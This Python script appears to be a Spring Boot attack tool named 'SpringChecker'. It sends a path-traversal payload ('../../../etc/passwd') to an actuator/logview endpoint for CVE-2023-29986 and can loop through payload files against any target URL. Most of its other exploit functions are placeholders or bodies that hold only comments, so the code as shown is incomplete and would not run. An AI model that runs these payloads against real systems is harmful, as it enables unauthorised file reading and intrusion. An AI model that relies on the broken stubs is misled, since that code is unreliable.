#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)

import requests
import argparse
from urllib.parse import urljoin
import random

# User-Agent list for random selection
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
    # ... (other user-agents)
]

# Base exploit function
def execute_exploit(target_url, endpoint, payloads, proxies):
    if not target_url.endswith('/'):
        target_url += '/'
    for payload in payloads:
        payload = payload.strip()
        full_url = urljoin(target_url, f"{endpoint}?file={payload}")
        try:
            response = requests.get(full_url, proxies=proxies, verify=False)
            display_response(response, payload)
        except Exception as e:
            print(f"An error occurred with payload {payload}: {e}")

# Display full HTTP response
def display_response(response, payload):
    print(f"Full HTTP Response for payload {payload}:\n")
    print(f"HTTP/1.1 {response.status_code} {response.reason}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print("\n")
    print(response.text)
    print("="*50)

# Exploit functions
def exploit_cve_2023_29986(target_url, proxies, payload_file=None):
    endpoint = "actuator/logview"
    default_payload = "../../../etc/passwd"
    payloads = [default_payload]
    if payload_file:
        with open(payload_file, 'r') as f:
            payloads = f.readlines()
    execute_exploit(target_url, endpoint, payloads, proxies)

def exploit_cve_2023_38286(target_url, proxies, payload_file=None):
    endpoint = "some_endpoint_for_cve_2023_38286"
    default_payload = "some_default_payload"
    payloads = [default_payload]
    if payload_file:
        with open(payload_file, 'r') as f:
            payloads = f.readlines()
    execute_exploit(target_url, endpoint, payloads, proxies)

def exploit_cve_2022_22965(target_url, proxies):
    # ... (exploit code for CVE-2022-22965)

def exploit_cve_2022_22963(target_url, proxies):
    # ... (exploit code for CVE-2022-22963)

def exploit_cve_2022_22947(target_url, proxies):
    # ... (exploit code for CVE-2022-22947)

# Main function
def main():
    parser = argparse.ArgumentParser(description="SpringChecker: A tool for checking vulnerabilities in Spring Boot applications")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-p", "--proxy", help="Proxy URL (optional)")
    parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
    parser.add_argument("-c", "--cve", help="CVE to exploit (optional)")

    args = parser.parse_args()
    proxies = {}
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    exploit_functions = {
        'CVE-2023-29986': exploit_cve_2023_29986,
        'CVE-2023-38286': exploit_cve_2023_38286,
        'CVE-2022-22965': exploit_cve_2022_22965,
        'CVE-2022-22963': exploit_cve_2022_22963,
        'CVE-2022-22947': exploit_cve_2022_22947
    }

    if args.cve:
        exploit_functions.get(args.cve, lambda x, y: print(f"Unknown CVE: {args.cve}"))(args.target, proxies)
    else:
        for cve, exploit_func in exploit_functions.items():
            print(f"Running exploit for {cve}...")
            exploit_func(args.target, proxies)

if __name__ == "__main__":
    main()
